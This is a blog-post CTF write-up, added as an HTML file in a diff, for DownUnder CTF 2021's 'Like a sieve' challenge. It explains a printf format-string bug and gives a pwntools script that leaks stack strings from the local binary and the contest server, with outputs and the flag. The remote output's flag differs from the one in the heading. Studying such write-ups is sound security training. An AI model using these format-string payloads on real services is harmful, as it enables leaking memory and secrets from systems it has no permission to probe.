@@ -1,0 +1,93 @@
+<!doctype html><html class="dark light" lang=en><head><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="width=device-width,initial-scale=1.0" name=viewport><meta content=https://kchitnis.com name=base><title>
+            
+                Like a sieve Writeup (DownUnder CTF 2021)
+            
+        </title><meta content="Like a sieve Writeup (DownUnder CTF 2021)" property=og:title><meta content="Kshitij Chitnis's blog website" property=og:description><meta content="Kshitij Chitnis's blog website" name=description><link href=https://kchitnis.com/favicon.ico rel=icon type=image/png><link crossorigin href=https://cdn.jsdelivr.net rel=preconnect><link href=https://cdn.jsdelivr.net/npm/jetbrains-mono@1.0.6/css/jetbrains-mono.min.css rel=stylesheet><link href=https://cdn.jsdelivr.net/npm/@fontsource/space-grotesk@4.5.8/index.min.css rel=stylesheet><script async data-goatcounter=https://kchitnis.goatcounter.com/count src=https://kchitnis.com/js/count.js></script><noscript><img src="https://kchitnis.goatcounter.com//count?p=/blogs/like-a-sieve/&t=Like a sieve Writeup (DownUnder CTF 2021)"></noscript><script>MathJax = {
+                tex: {
+                    inlineMath: [
+                        ['$', '$'],
+                        ['\\(', '\\)']
+                    ]
+                }
+            };</script><script async id=MathJax-script src=https://cdn.jsdelivr.net/npm/mathjax@4/tex-mml-chtml.js></script><link media="(prefers-color-scheme: dark)" href=https://kchitnis.com/giallo-dark.css rel=stylesheet><link media="(prefers-color-scheme: light)" href=https://kchitnis.com/giallo-light.css rel=stylesheet><link href=https://kchitnis.com/theme/light.css rel=stylesheet><link media="(prefers-color-scheme: dark)" href=https://kchitnis.com/theme/dark.css rel=stylesheet><script src=https://kchitnis.com/js/themetoggle.js></script><script>if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                    setTheme("dark");
+                } else {
+                    setTheme("light");
+                }</script><link href=https://kchitnis.com/main.css media=screen rel=stylesheet><link href=https://kchitnis.com/custom.css rel=stylesheet><body><div class=left-content></div><div class=content><nav><div class=left-nav><a href=https://kchitnis.com>kchitnis</a><div class=socials><a rel="me noopener" class=social href=https://github.com/m0rphtail/ target=_blank> <img alt=github src=https://kchitnis.com/icons/social/github.svg> </a><a rel="me noopener" class=social href=https://x.com/MorphTail target=_blank> <img alt=twitter src=https://kchitnis.com/icons/social/twitter.svg> </a><a rel="me noopener" class=social href=https://linkedin.com/in/kshitijchitnis target=_blank> <img alt=linkedin src=https://kchitnis.com/icons/social/linkedin.svg> </a><a rel="me noopener" class=social href=mailto:chitniskshitij@gmail.com target=_blank> <img alt=email src=https://kchitnis.com/icons/social/email.svg> </a></div></div><div class=right-nav><a href=https://kchitnis.com/blogs style=margin-right:.5em>/blogs</a><a href=https://kchitnis.com/resume style=margin-right:.5em>/resume</a><a href=https://kchitnis.com/art style=margin-right:.5em>/art</a><a href=https://kchitnis.com/music style=margin-right:.5em>/music</a></div></nav><div data-selector="main article p" class=visible-element-observer-root><main><article><div class=title><div class=page-header>Like a sieve Writeup (DownUnder CTF 2021)</div><div class=meta>Posted on <time>2021-09-28</time> :: Updated on <time>2024-07-12</time></div></div><section class=body><blockquote><p>This program I developed will greet you, but my friend said it is leaking data like a sieve, what did I forget to add?<p>Author: xXl33t_h@x0rXx</blockquote><h2 id=analysis><a aria-label="Anchor link for: analysis" class=zola-anchor href=#analysis>Analysis</a></h2><h1 id=checksec><a aria-label="Anchor link for: checksec" class=zola-anchor href=#checksec>checksec</a></h1><pre class="giallo z-l-code z-d-code"><code data-lang=plain><span class=giallo-l><span>Canary                        : ✘ </span></span>
+<span class=giallo-l><span>NX                            : ✓ </span></span>
+<span class=giallo-l><span>PIE                           : ✓ </span></span>
+<span class=giallo-l><span>Fortify                       : ✘ </span></span>
+<span class=giallo-l><span>RelRO                         : Partial</span></span></code></pre><h2 id=decompile-with-radare2><a aria-label="Anchor link for: decompile-with-radare2" class=zola-anchor href=#decompile-with-radare2>Decompile with radare2</a></h2><pre class="giallo z-l-code z-d-code"><code data-lang=c><span class=giallo-l><span class="z-l-1 z-d-3">void</span><span class="z-l-14 z-d-18"> main</span><span>(</span><span class="z-l-1 z-d-3">void</span><span>)</span><span>{</span></span>
+<span class=giallo-l><span class="z-l-1 z-d-3">    int64_t</span><span> iVar1</span><span class="z-l-6 z-d-9">;</span></span>
+<span class=giallo-l><span class="z-l-1 z-d-3">    int64_t</span><span> in_FS_OFFSET</span><span class="z-l-6 z-d-9">;</span></span>
+<span class=giallo-l><span class="z-l-1 z-d-3">    int64_t</span><span> var_60h</span><span class="z-l-6 z-d-9">;</span></span>
+<span class=giallo-l><span>    undefined8 stream</span><span class="z-l-6 z-d-9">;</span></span>
+<span class=giallo-l><span class="z-l-1 z-d-3">    char</span><span class="z-l-16 z-d-16"> *</span><span>format</span><span class="z-l-6 z-d-9">;</span></span>
+<span class=giallo-l><span class="z-l-1 z-d-3">    char</span><span class="z-l-16 z-d-16"> *</span><span>s</span><span class="z-l-6 z-d-9">;</span></span>
+<span class=giallo-l><span class="z-l-1 z-d-3">    int64_t</span><span> var_8h</span><span class="z-l-6 z-d-9">;</span></span>
+<span class=giallo-l><span>    </span></span>
+<span class=giallo-l><span>    var_8h </span><span class="z-l-16 z-d-16">=</span><span class="z-l-16 z-d-16"> *</span><span>(</span><span class="z-l-1 z-d-3">int64_t</span><span class="z-l-16 z-d-16"> *</span><span>)</span><span>(</span><span>in_FS_OFFSET </span><span class="z-l-16 z-d-16">+</span><span class="z-l-17 z-d-17"> 0x</span><span class="z-l-9 z-d-11">28</span><span>)</span><span class="z-l-6 z-d-9">;</span></span>
+<span class=giallo-l><span>    sym</span><span class="z-l-6 z-d-9">.</span><span class="z-l-14 z-d-18">buffer_init</span><span>(</span><span>)</span><span class="z-l-6 z-d-9">;</span></span>
+<span class=giallo-l><span>    iVar1 </span><span class="z-l-16 z-d-16">=</span><span> sym</span><span class="z-l-6 z-d-9">.</span><span>imp</span><span class="z-l-6 z-d-9">.</span><span class="z-l-14 z-d-18">fopen</span><span>(</span><span class="z-l-8 z-d-8">"</span><span class="z-l-8 z-d-8">./flag.txt</span><span class="z-l-8 z-d-8">"</span><span class="z-l-6 z-d-9">,</span><span class="z-l-17 z-d-17"> 0x</span><span class="z-l-9 z-d-11">2008</span><span>)</span><span class="z-l-6 z-d-9">;</span></span>
+<span class=giallo-l><span class="z-l-17 z-d-17">    if</span><span> (</span><span>iVar1 </span><span class="z-l-16 z-d-16">==</span><span class="z-l-9 z-d-11"> 0</span><span>)</span><span> {</span></span>
+<span class=giallo-l><span>        sym</span><span class="z-l-6 z-d-9">.</span><span>imp</span><span class="z-l-6 z-d-9">.</span><span class="z-l-14 z-d-18">puts</span><span>(</span></span>
+<span class=giallo-l><span class="z-l-8 z-d-8">                    "</span><span class="z-l-8 z-d-8">The flag file isn</span><span class="z-l-3 z-d-7">\'</span><span class="z-l-8 z-d-8">t loading. Please contact an organiser if you are running this on the shell server.</span><span class="z-l-8 z-d-8">"</span></span>
+<span class=giallo-l><span>                    )</span><span class="z-l-6 z-d-9">;</span></span>
+<span class=giallo-l><span>        sym</span><span class="z-l-6 z-d-9">.</span><span>imp</span><span class="z-l-6 z-d-9">.</span><span class="z-l-14 z-d-18">exit</span><span>(</span><span class="z-l-9 z-d-11">0</span><span>)</span><span class="z-l-6 z-d-9">;</span></span>
+<span class=giallo-l><span>    }</span></span>
+<span class=giallo-l><span>    sym</span><span class="z-l-6 z-d-9">.</span><span>imp</span><span class="z-l-6 z-d-9">.</span><span class="z-l-14 z-d-18">fgets</span><span>(</span><span class="z-l-16 z-d-16">&</span><span>s</span><span class="z-l-6 z-d-9">,</span><span class="z-l-17 z-d-17"> 0x</span><span class="z-l-9 z-d-11">20</span><span class="z-l-6 z-d-9">,</span><span> iVar1</span><span>)</span><span class="z-l-6 z-d-9">;</span></span>
+<span class=giallo-l><span class="z-l-17 z-d-17">    do</span><span> {</span></span>
+<span class=giallo-l><span>        sym</span><span class="z-l-6 z-d-9">.</span><span>imp</span><span class="z-l-6 z-d-9">.</span><span class="z-l-14 z-d-18">puts</span><span>(</span><span class="z-l-8 z-d-8">"</span><span class="z-l-8 z-d-8">What is your name?</span><span class="z-l-8 z-d-8">"</span><span>)</span><span class="z-l-6 z-d-9">;</span></span>
+<span class=giallo-l><span>        sym</span><span class="z-l-6 z-d-9">.</span><span>imp</span><span class="z-l-6 z-d-9">.</span><span class="z-l-14 z-d-18">fgets</span><span>(</span><span class="z-l-16 z-d-16">&</span><span>format</span><span class="z-l-6 z-d-9">,</span><span class="z-l-17 z-d-17"> 0x</span><span class="z-l-9 z-d-11">20</span><span class="z-l-6 z-d-9">,</span><span> _reloc</span><span class="z-l-6 z-d-9">.</span><span>stdin</span><span>)</span><span class="z-l-6 z-d-9">;</span></span>
+<span class=giallo-l><span>        sym</span><span class="z-l-6 z-d-9">.</span><span>imp</span><span class="z-l-6 z-d-9">.</span><span class="z-l-14 z-d-18">printf</span><span>(</span><span class="z-l-8 z-d-8">"</span><span class="z-l-3 z-d-7">\n</span><span class="z-l-8 z-d-8">Hello there, </span><span class="z-l-8 z-d-8">"</span><span>)</span><span class="z-l-6 z-d-9">;</span></span>
+<span class=giallo-l><span>        sym</span><span class="z-l-6 z-d-9">.</span><span>imp</span><span class="z-l-6 z-d-9">.</span><span class="z-l-14 z-d-18">printf</span><span>(</span><span class="z-l-16 z-d-16">&</span><span>format</span><span>)</span><span class="z-l-6 z-d-9">;</span></span>
+<span class=giallo-l><span>        sym</span><span class="z-l-6 z-d-9">.</span><span>imp</span><span class="z-l-6 z-d-9">.</span><span class="z-l-14 z-d-18">putchar</span><span>(</span><span class="z-l-9 z-d-11">10</span><span>)</span><span class="z-l-6 z-d-9">;</span></span>
+<span class=giallo-l><span>    }</span><span class="z-l-17 z-d-17"> while</span><span>(</span><span class="z-l-9 z-d-11"> true</span><span> )</span><span class="z-l-6 z-d-9">;</span></span>
+<span class=giallo-l><span>}</span></span></code></pre><p>From the decompiled code we can see that the last printf call does not have a format specifier.<p>So we can abuse it like this<pre class="giallo z-l-code z-d-code"><code data-lang=plain><span class=giallo-l><span>$ ./hellothere</span></span>
+<span class=giallo-l><span>what is your name?</span></span>
+<span class=giallo-l><span>%x</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span>Hello there, 8851cea0</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span>what is your name?</span></span></code></pre><p>But to leak the flag, we need to find the number of stack postions to leak after.<p>We can try to use a for loop to find it.<h3 id=exploit><a aria-label="Anchor link for: exploit" class=zola-anchor href=#exploit>Exploit</a></h3><pre class="giallo z-l-code z-d-code"><code data-lang=python><span class=giallo-l><span class="z-l-17 z-d-17">from</span><span> pwn</span><span class="z-l-17 z-d-17"> import</span><span class="z-l-16 z-d-16"> *</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span class="z-l-17 z-d-17">if</span><span> args</span><span class="z-l-6 z-d-9">.</span><span class="z-l-3 z-d-7">REMOTE</span><span class="z-l-6 z-d-9">:</span></span>
+<span class=giallo-l><span>    p</span><span class="z-l-16 z-d-16">=</span><span class="z-l-14 z-d-18">remote</span><span>(</span><span class="z-l-8 z-d-8">'</span><span class="z-l-8 z-d-8">pwn-2021.duc.tf</span><span class="z-l-8 z-d-8">'</span><span class="z-l-6 z-d-9">,</span><span class="z-l-9 z-d-11"> 31918</span><span>)</span></span>
+<span class=giallo-l><span class="z-l-17 z-d-17">else</span><span class="z-l-6 z-d-9">:</span></span>
+<span class=giallo-l><span>    p</span><span class="z-l-16 z-d-16">=</span><span class="z-l-14 z-d-18">process</span><span>(</span><span class="z-l-8 z-d-8">'</span><span class="z-l-8 z-d-8">./hellothere</span><span class="z-l-8 z-d-8">'</span><span>)</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span class="z-l-17 z-d-17">for</span><span> i</span><span class="z-l-17 z-d-17"> in</span><span class="z-l-15 z-d-14"> range</span><span>(</span><span class="z-l-9 z-d-11">8</span><span>)</span><span class="z-l-6 z-d-9">:</span></span>
+<span class=giallo-l><span>    p</span><span class="z-l-6 z-d-9">.</span><span class="z-l-14 z-d-18">recvuntil</span><span>(</span><span class="z-l-8 z-d-8">"</span><span class="z-l-8 z-d-8">name?</span><span class="z-l-8 z-d-8">"</span><span>)</span></span>
+<span class=giallo-l><span class="z-l-15 z-d-14">    print</span><span>(</span><span>i</span><span>)</span></span>
+<span class=giallo-l><span>    p</span><span class="z-l-6 z-d-9">.</span><span class="z-l-14 z-d-18">sendline</span><span>(</span><span class="z-l-8 z-d-8">"</span><span class="z-l-8 z-d-8">%</span><span class="z-l-8 z-d-8">"</span><span class="z-l-16 z-d-16">+</span><span class="z-l-4 z-d-1">str</span><span>(</span><span>i</span><span>)</span><span class="z-l-16 z-d-16">+</span><span class="z-l-8 z-d-8">"</span><span class="z-l-8 z-d-8">$s</span><span class="z-l-8 z-d-8">"</span><span>)</span></span>
+<span class=giallo-l><span>    p</span><span class="z-l-6 z-d-9">.</span><span class="z-l-14 z-d-18">recvuntil</span><span>(</span><span class="z-l-8 z-d-8">"</span><span class="z-l-8 z-d-8">there,</span><span class="z-l-8 z-d-8">"</span><span>)</span></span>
+<span class=giallo-l><span class="z-l-15 z-d-14">    print</span><span>(</span><span>p</span><span class="z-l-6 z-d-9">.</span><span class="z-l-14 z-d-18">recvline</span><span>(</span><span>)</span><span>)</span></span></code></pre><p>Running locally<pre class="giallo z-l-code z-d-code"><code data-lang=plain><span class=giallo-l><span>$ python hello_x.py</span></span>
+<span class=giallo-l><span>[+] Starting local process '/hellothere': pid 37450</span></span>
+<span class=giallo-l><span>0</span></span>
+<span class=giallo-l><span>    %0$s</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span>1</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span>2</span></span>
+<span class=giallo-l><span>    (null)</span></span>
+<span class=giallo-l><span>    </span></span>
+<span class=giallo-l><span>3</span></span>
+<span class=giallo-l><span>    H=</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span>4</span></span>
+<span class=giallo-l><span>    %4$s</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span>5</span></span>
+<span class=giallo-l><span>    (null)</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span>6  </span></span>
+<span class=giallo-l><span>    DUCTF {test_flag}</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span>7</span></span>
+<span class=giallo-l><span>    \x88S\xad?</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span>[*] Stopped process './hellothere' (pid 37450)</span></span></code></pre><p>Running on remote<pre class="giallo z-l-code z-d-code"><code data-lang=plain><span class=giallo-l><span>$ python hello_x.py</span></span>
+<span class=giallo-l><span>[+] Opening connection to pwn-2021.duc.tf on port 31918: Done</span></span>
+<span class=giallo-l><span>DUCTF[fOrm4t_5p3c1f13r_m3dsg!}</span></span>
+<span class=giallo-l><span>[*] Closed connection to pwn-2021.duc.tf port 31918</span></span></code></pre><h4 id=flag-ductf-f0rm4t-5p3c1f13r-m3dsg><a aria-label="Anchor link for: flag-ductf-f0rm4t-5p3c1f13r-m3dsg" class=zola-anchor href=#flag-ductf-f0rm4t-5p3c1f13r-m3dsg><strong>flag >></strong> <code> DUCTF{f0rm4t_5p3c1f13r_m3dsg!}</code></a></h4></section></article></main></div></div><div class=right-content></div>
